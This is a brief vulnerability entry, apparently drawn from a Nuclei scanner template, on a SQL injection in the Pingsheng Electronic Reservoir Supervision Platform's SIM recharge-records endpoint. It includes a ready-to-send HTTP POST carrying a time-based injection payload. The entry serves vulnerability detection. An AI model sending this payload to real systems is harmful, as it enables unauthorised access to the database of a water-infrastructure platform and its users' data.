# Vulnerability: Pingsheng Electronic Reservoir Supervision Platform - Sql Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`pingsheng-electronic-sqli.yaml`)

## Description
There is a SQL injection vulnerability in the GetAllRechargeRecordsBySIMCardId interface of Pingsheng Electronics Reservoir Supervision Platform. An attacker can access the data in the database without authorization, thereby stealing user data and leaking user information.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout 20s
POST /WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

loginIdentifer=&simcardId=';WAITFOR DELAY '0:0:6'--
```

